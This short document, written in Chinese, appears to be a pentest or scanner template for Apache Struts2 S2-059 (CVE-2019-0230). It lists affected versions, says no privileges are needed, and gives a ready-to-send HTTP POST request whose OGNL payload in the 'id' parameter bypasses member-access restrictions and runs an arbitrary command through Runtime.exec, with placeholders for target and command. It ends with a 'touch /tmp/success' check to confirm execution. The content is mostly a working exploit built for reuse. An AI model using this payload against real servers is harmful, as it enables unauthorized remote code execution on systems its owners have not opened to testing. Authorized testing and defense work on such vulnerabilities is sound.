# S2-059 OGNL 注入 RCE (CVE-2019-0230)

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.5.20)
- 场景: 某些标签属性 (如 `id`) 存在二次解析

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 标签属性注入 | `/?id=...` | 无 |

## PoC 指令

通过构造包含 OGNL 表达式的 `id` 参数，利用二次解析实现 RCE：

```http
POST / HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

id=%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('{{COMMAND}}'))}
```

## Success Signal
- **物理验证**: 命令成功执行。
- **状态验证**: 执行 `touch /tmp/success` 后验证文件是否存在。
